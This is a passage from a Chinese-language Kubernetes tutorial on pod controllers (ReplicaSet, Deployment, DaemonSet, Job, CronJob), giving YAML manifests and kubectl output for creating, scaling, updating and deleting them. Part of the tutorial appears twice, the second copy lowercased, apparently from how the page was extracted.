14m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\ndeployment 变化\n\n[root@k8s-master01 ~]# kubectl get deployment -n dev -w\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           11m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     1            1           13m\nnginx   1/4     4            1           13m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     4            1           14m\nnginx   1/8     8            1           14m\nnginx   2/8     8            2           14m\nnginx   3/8     8            3           14m\nnginx   4/8     8            4           14m\nnginx   5/8     8            5           14m\nnginx   6/8     8            6           14m\nnginx   7/8     8            7           14m\nnginx   8/8     8            8           15m\nnginx   8/1     8            8           20m\nnginx   8/1     8            8           20m\nnginx   1/1     1            1           20m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\npod 变化\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-7df9756ccc-bh8dr   1/1     Running   0          11m\nnginx-7df9756ccc-cpgrv   0/1     Pending   0          0s\nnginx-7df9756ccc-8zhwk   0/1     Pending   0          0s\nnginx-7df9756ccc-rr9bn   0/1     Pending   0          0s\nnginx-7df9756ccc-cpgrv   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-rr9bn   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     Pending             0          0s\nnginx-7df9756ccc-sl9c6   0/1     Pending             0          0s\nnginx-7df9756ccc-fgst7   0/1     Pending             0          0s\nnginx-7df9756ccc-g56qb   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-m9gsj   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-sl9c6   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-fgst7   0/1     ContainerCreating   0          0s\nnginx-7df9756ccc-8zhwk   1/1     Running             0          19s\nnginx-7df9756ccc-rr9bn   1/1     Running             0          30s\nnginx-7df9756ccc-m9gsj   1/1     Running             0          21s\nnginx-7df9756ccc-cpgrv   1/1     Running             0          47s\nnginx-7df9756ccc-sl9c6   1/1     Running             0          33s\nnginx-7df9756ccc-g56qb   1/1     Running             0          48s\nnginx-7df9756ccc-fgst7   1/1     Running             0          66s\nnginx-7df9756ccc-fgst7   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-8zhwk   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-cpgrv   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-g56qb   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-rr9bn   1/1     Terminating         0          7m5s\nnginx-7df9756ccc-m9gsj   1/1     Terminating         0          6m50s\nnginx-7df9756ccc-sl9c6   1/1     Terminating         0          6m50s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# DaemonSet(DS)\n\nDaemonSet 类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个 Pod 提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类 Pod 就适合使用 DaemonSet 类型的控制器创建。\n\n\n\nDaemonSet 控制器的特点：\n\n * 每当向集群中添加一个节点时，指定的 Pod 副本也将添加到该节点上\n * 当节点从集群中移除时，Pod 也就被垃圾回收了\n\n下面先来看下 DaemonSet 的资源清单文件\n\napiVersion: apps/v1 # 版本号\nkind: DaemonSet # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: daemonset\nspec: # 详情描述\n  revisionHistoryLimit: 3 # 保留历史版本\n  updateStrategy: # 更新策略\n    type: RollingUpdate # 滚动更新策略\n    rollingUpdate: # 滚动更新\n      maxUnavailable: 1 # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: nginx-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n创建 pc-daemonset.yaml，内容如下：\n\napiVersion: apps/v1\nkind: DaemonSet      \nmetadata:\n  name: pc-daemonset\n  namespace: dev\nspec: \n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建daemonset\n[root@k8s-master01 ~]# kubectl create -f  pc-daemonset.yaml\ndaemonset.apps/pc-daemonset created\n\n# 查看daemonset\n[root@k8s-master01 ~]#  kubectl get ds -n dev -o wide\nNAME        DESIRED  CURRENT  READY  UP-TO-DATE  AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-daemonset   2        2        2      2           2        24s   nginx        nginx:1.17.1   \n\n# 查看pod,发现在每个Node上都运行一个pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev -o wide\nNAME                 READY   STATUS    RESTARTS   AGE   IP            NODE    \npc-daemonset-9bck8   1/1     Running   0          37s   10.244.1.43   node1     \npc-daemonset-k224w   1/1     Running   0          37s   10.244.2.74   node2      \n\n# 删除daemonset\n[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yaml\ndaemonset.apps "pc-daemonset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Job\n\nJob，主要用于负责 ** 批量处理 (一次要处理指定数量任务) 短暂的一次性 (每个任务仅运行一次就结束)** 任务。Job 特点如下：\n\n * 当 Job 创建的 pod 执行成功结束时，Job 将记录成功结束的 pod 数量\n * 当成功结束的 pod 达到指定的数量时，Job 将完成执行\n\n\n\nJob 的资源清单文件：\n\napiVersion: batch/v1 # 版本号\nkind: Job # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: job\nspec: # 详情描述\n  completions: 1 # 指定job需要成功运行Pods的次数。默认值: 1\n  parallelism: 1 # 指定job在任一时刻应该并发运行Pods的数量。默认值: 1\n  activeDeadlineSeconds: 30 # 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。\n  backoffLimit: 6 # 指定job失败后进行重试的次数。默认是6\n  manualSelector: true # 是否可以使用selector选择器选择pod，默认是false\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: counter-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [counter-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never # 重启策略只能设置为Never或者OnFailure\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n> 关于重启策略设置的说明：\n> 如果指定为 OnFailure，则 job 会在 pod 出现故障时重启容器，而不是创建 pod，failed 次数不变\n> 如果指定为 Never，则 job 会在 pod 出现故障时创建新的 pod，并且故障 pod 不会消失，也不会重启，failed 次数加 1\n> 如果指定为 Always 的话，就意味着一直重启，意味着 job 任务会重复去执行了，当然不对，所以不能设置为 Always\n\n创建 pc-job.yaml，内容如下：\n\napiVersion: batch/v1\nkind: Job      \nmetadata:\n  name: pc-job\n  namespace: dev\nspec:\n  manualSelector: true\n  selector:\n    matchLabels:\n      app: counter-pod\n  template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 创建job\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nNAME     COMPLETIONS   DURATION   AGE   CONTAINERS   IMAGES         SELECTOR\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# 通过观察pod状态可以看到，pod在运行完毕任务后，就会变成Completed状态\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS     RESTARTS      AGE\npc-job-rxg96   1/1     Running     0            29s\npc-job-rxg96   0/1     Completed   0            33s\n\n# 接下来，调整下pod运行的总数量和并行数量 即：在spec下设置下面两个选项\n#  completions: 6 # 指定job需要成功运行Pods的次数为6\n#  parallelism: 3 # 指定job并发运行Pods的数量为3\n#  然后重新运行job，观察效果，此时会发现，job会每次运行3个pod，总共执行了6个pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS    RESTARTS   AGE\npc-job-684ft   1/1     Running   0          5s\npc-job-jhj49   1/1     Running   0          5s\npc-job-pfcvh   1/1     Running   0          5s\npc-job-684ft   0/1     Completed   0          11s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     ContainerCreating   0          0s\npc-job-jhj49   0/1     Completed           0          11s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-pfcvh   0/1     Completed           0          11s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-fhwf7   0/1     ContainerCreating   0          0s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-5vg2j   0/1     ContainerCreating   0          0s\npc-job-fhwf7   1/1     Running             0          2s\npc-job-v7rhr   1/1     Running             0          2s\npc-job-5vg2j   1/1     Running             0          3s\npc-job-fhwf7   0/1     Completed           0          12s\npc-job-v7rhr   0/1     Completed           0          12s\npc-job-5vg2j   0/1     Completed           0          12s\n\n# 删除job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# CronJob(CJ)\n\nCronJob 控制器以 Job 控制器资源为其管控对象，并借助它管理 pod 资源对象，Job 控制器定义的作业任务在其控制器资源创建之后便会立即执行，但 CronJob 可以以类似于 Linux 操作系统的周期性任务作业计划的方式控制其运行时间点及重复运行的方式。也就是说，CronJob 可以在特定的时间点 (反复的) 去运行 job 任务。\n\n\n\nCronJob 的资源清单文件：\n\napiVersion: batch/v1beta1 # 版本号\nkind: CronJob # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: cronjob\nspec: # 详情描述\n  schedule: # cron格式的作业调度运行时间点,用于控制任务在什么时间执行\n  concurrencyPolicy: # 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业\n  failedJobHistoryLimit: # 为失败的任务执行保留的历史记录数，默认为1\n  successfulJobHistoryLimit: # 为成功的任务执行保留的历史记录数，默认为3\n  startingDeadlineSeconds: # 启动作业错误的超时时长\n  jobTemplate: # job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activeDeadlineSeconds: 30\n      backoffLimit: 6\n      manualSelector: true\n      selector:\n        matchLabels:\n          app: counter-pod\n        matchExpressions: 规则\n          - {key: app, operator: In, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartPolicy: Never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n需要重点解释的几个选项：\nschedule: cron表达式，用于指定任务的执行时间\n    */1    *      *    *     *\n    <分钟> <小时> <日> <月份> <星期>\n\n    分钟 值从 0 到 59.\n    小时 值从 0 到 23.\n    日 值从 1 到 31.\n    月 值从 1 到 12.\n    星期 值从 0 到 6, 0 代表星期日\n    多个时间可以用逗号隔开； 范围可以用连字符给出；*可以作为通配符； /表示每...\nconcurrencyPolicy: 比如a任务1分钟运行一次，可是a任务本次运行了超过1分钟，那么是否允许让下个周期的任务运行？\n    Allow:   允许Jobs并发运行(默认)\n    Forbid:  禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行\n    Replace: 替换，取消当前正在运行的作业并用新作业替换它\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pc-cronjob.yaml，内容如下：\n\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobTemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartPolicy: Never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 创建cronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# 查看cronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nNAME         SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE\npc-cronjob   */1 * * * *   False     0        <none>          6s\n\n# 查看job\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nNAME                    COMPLETIONS   DURATION   AGE\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     Completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     Completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     Running     0          24s\n\n\n# 删除cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',normalizedContent:'# pod 控制器介绍\n\npod 是 kubernetes 的最小管理单元，在 kubernetes 中，按照 pod 的创建方式可以将其分为两类：\n\n * 自主式 pod：kubernetes 直接创建出来的 pod，这种 pod 删除后就没有了，也不会重建\n * 控制器创建的 pod：kubernetes 通过控制器创建的 pod，这种 pod 删除了之后还会自动重建\n\n> 什么是pod控制器\n> pod 控制器是管理 pod 的中间层，使用 pod 控制器之后，只需要告诉 pod 控制器，想要多少个什么样的 pod 就可以了，它会创建出满足条件的 pod 并确保每一个 pod 资源处于用户期望的目标状态。如果 pod 资源在运行中出现故障，它会基于指定策略重新编排 pod。\n\n在 kubernetes 中，有很多类型的 pod 控制器，每种都有自己的适合的场景，常见的有下面这些：\n\n * replicationcontroller：比较原始的 pod 控制器，已经被废弃，由 replicaset 替代\n * replicaset：保证副本数量一直维持在期望值，并支持 pod 数量扩缩容，镜像版本升级\n * deployment：通过控制 replicaset 来控制 pod，并支持滚动升级、回退版本\n * horizontal pod autoscaler：可以根据集群负载自动水平调整 pod 的数量，实现削峰填谷\n * daemonset：在集群中的指定 node 上运行且仅运行一个副本，一般用于守护进程类的任务\n * job：它创建出来的 pod 只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务\n * cronjob：它创建的 pod 负责周期性任务控制，不需要持续后台运行\n * statefulset：管理有状态应用\n\n\n# replicaset(rs)\n\nreplicaset 的主要作用是保证一定数量的 pod 正常运行，它会持续监听这些 pod 的运行状态，一旦 pod 发生故障，就会重启或重建。同时它还支持对 pod 数量的扩缩容和镜像版本的升降级。\n\n\n\nreplicaset 的资源清单文件：\n\napiversion: apps/v1 # 版本号\nkind: replicaset # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: rs\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: nginx-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在这里面，需要新了解的配置项就是 spec 下面几个选项：\n\n * replicas：指定副本数量，其实就是当前 rs 创建出来的 pod 的数量，默认为 1\n * selector：选择器，它的作用是建立 pod 控制器和 pod 之间的关联关系，采用的 label selector 机制\n   在 pod 模板上定义 label，在控制器上定义选择器，就可以表明当前控制器能管理哪些 pod 了\n * template：模板，就是当前控制器创建 pod 所使用的模板板，里面其实就是前一章学过的 pod 的定义\n\n创建 replicaset\n创建 pc-replicaset.yaml 文件，内容如下：\n\napiversion: apps/v1\nkind: replicaset   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建rs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# 查看rs\n# desired:期望副本数量  \n# current:当前副本数量  \n# ready:已经准备好提供服务的副本数量\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nname          desired   current ready age   containers   images             selector\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# 查看当前控制器创建出来的pod\n# 这里发现控制器创建出来的pod的名称是在控制器名称后面拼接了-xxxxx随机码\n[root@k8s-master01 ~]# kubectl get pod -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          54s\npc-replicaset-fmb8f   1/1     running   0          54s\npc-replicaset-snrk2   1/1     running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n扩缩容\n\n# 编辑rs的副本数量，修改spec:replicas: 6即可\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          114m\npc-replicaset-cftnp   1/1     running   0          10s\npc-replicaset-fjlm6   1/1     running   0          10s\npc-replicaset-fmb8f   1/1     running   0          114m\npc-replicaset-s2whj   1/1     running   0          10s\npc-replicaset-snrk2   1/1     running   0          114m\n\n# 当然也可以直接使用命令实现\n# 使用scale命令实现扩缩容， 后面--replicas=n直接指定目标数量即可\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# 命令运行完毕，立即查看，发现已经有4个开始准备退出了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status        restarts   age\npc-replicaset-6vmvt   0/1     terminating   0          118m\npc-replicaset-cftnp   0/1     terminating   0          4m17s\npc-replicaset-fjlm6   0/1     terminating   0          4m17s\npc-replicaset-fmb8f   1/1     running       0          118m\npc-replicaset-s2whj   0/1     terminating   0          4m17s\npc-replicaset-snrk2   1/1     running       0          118m\n\n#稍等片刻，就只剩下2个了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status    restarts   age\npc-replicaset-fmb8f   1/1     running   0          119m\npc-replicaset-snrk2   1/1     running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n镜像升级\n\n# 编辑rs的容器镜像 - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                desired  current   ready   age    containers   images        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# 同样的道理，也可以使用命令完成这个工作\n# kubectl set image rs rs名称 容器=镜像版本 -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                 desired  current   ready   age    containers   images            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n删除 replicaset\n\n# 使用kubectl delete命令会删除此rs以及它管理的pod\n# 在kubernetes删除rs前，会将rs的replicasclear调整为0，等待所有的pod被删除后，在执行rs对象的删除\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nno resources found in dev namespace.\n\n# 如果希望仅仅删除rs对象（保留pod），可以使用kubectl delete命令时添加--cascade=false选项（不推荐）。\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                  ready   status    restarts   age\npc-replicaset-cl82j   1/1     running   0          75s\npc-replicaset-dslhb   1/1     running   0          75s\n\n# 也可以使用yaml直接删除(推荐)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# deployment(deploy)\n\n为了更好的解决服务编排的问题，kubernetes 在 v1.2 版本开始，引入了 deployment 控制器。值得一提的是，这种控制器并不直接管理 pod，而是通过管理 replicaset 来简介管理 pod，即：deployment 管理 replicaset，replicaset 管理 pod。所以 deployment 比 replicaset 功能更加强大。\n\n\n\ndeployment 主要功能有下面几个：\n\n * 支持 replicaset 的所有功能\n * 支持发布的停止、继续\n * 支持滚动更新和回滚版本\n\ndeployment 的资源清单文件：\n\napiversion: apps/v1 # 版本号\nkind: deployment # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: deploy\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  revisionhistorylimit: 3 # 保留历史版本\n  paused: false # 暂停部署，默认是false\n  progressdeadlineseconds: 600 # 部署超时时间（s），默认是600\n  strategy: # 策略\n    type: rollingupdate # 滚动更新策略\n    rollingupdate: # 滚动更新\n      maxsurge: 30% # 最大额外可以存在的副本数，可以为百分比，也可以为整数\n      maxunavailable: 30% # 最大不可用状态的 pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchlabels:      # labels匹配规则\n      app: nginx-pod\n    matchexpressions: # expressions匹配规则\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n创建 deployment\n创建 pc-deployment.yaml，内容如下：\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建deployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# 查看deployment\n# up-to-date 最新版本的pod的数量\n# available  当前可用的pod的数量\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   3/3     3            3           15s\n\n# 查看rs\n# 发现rs的名称是在原来deployment的名字后面添加了一个10位数的随机串\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   3         3         3       23s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          107s\npc-deployment-6696798b78-smpvp   1/1     running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n扩缩容\n\n# 变更副本数量为5个\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# 查看deployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   5/5     5            5           2m\n\n# 查看pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     running   0          94s\npc-deployment-6696798b78-mktqv   1/1     running   0          93s\npc-deployment-6696798b78-smpvp   1/1     running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     running   0          4m19s\n\n# 编辑deployment的副本数量，修改spec:replicas: 4即可\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n镜像更新\ndeployment 支持两种更新策略: 重建更新（删掉所有老版本得pod，然后重建新版本的pod） 和 滚动更新（默认）（不会一次性删除，先删一部分低版本，建立一部分新版本，以此类推，直到满足数量） , 可以通过 strategy 指定策略类型，支持两个属性:\n\nstrategy：指定新的pod替换旧的pod的策略， 支持两个属性：\n  type：指定策略类型，支持两种策略\n    recreate：在创建出新的pod之前会先杀掉所有已存在的pod\n    rollingupdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本pod\n  rollingupdate：当type为rollingupdate时生效，用于为rollingupdate设置参数，支持两个属性：\n    maxunavailable：用来指定在升级过程中不可用pod的最大数量，默认为25%。\n    maxsurge： 用来指定在升级过程中可以超过期望的pod的最大数量，默认为25%。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n重建更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: recreate # 重建更新\n\n\n1\n2\n3\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-65qcw   